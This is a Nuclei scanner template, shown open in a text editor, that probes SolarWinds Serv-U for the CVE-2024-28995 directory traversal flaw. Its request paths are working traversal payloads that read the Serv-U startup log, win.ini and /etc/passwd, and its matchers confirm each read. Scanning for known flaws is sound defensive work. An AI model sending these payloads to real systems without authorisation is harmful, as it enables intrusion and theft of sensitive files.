  GNU nano 8.0                                /home/kaks3c/tools/templates/my-cves/CVE-2024-28995.yaml                                         id: CVE-2024-28995

info:
  name: SolarWinds Serv-U Directory Traversal Vulnerability
  author: kaks3c
  severity: high
  description: |
    A directory traversal vulnerability in SolarWinds Serv-U allows reading sensitive files from the host.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-28995

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?InternalDir=/../../../../ProgramData/RhinoSoft/Serv-U/&InternalFile=Serv-U-StartupLog.txt"
      - "{{BaseURL}}/?InternalDir=../../../../../Windows&InternalFile=win.ini"
      - "{{BaseURL}}/?InternalDir=\\..\\..\\..\\..\\etc&InternalFile=passwd" # Linux specific check

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"

    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "(Operating System:|Serv-U File Server:|Build Date:)"

      - type: regex
        part: body
        regex:
          - "\\[(font|extension|file)s\\]"

      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body

stop-at-first-match: true
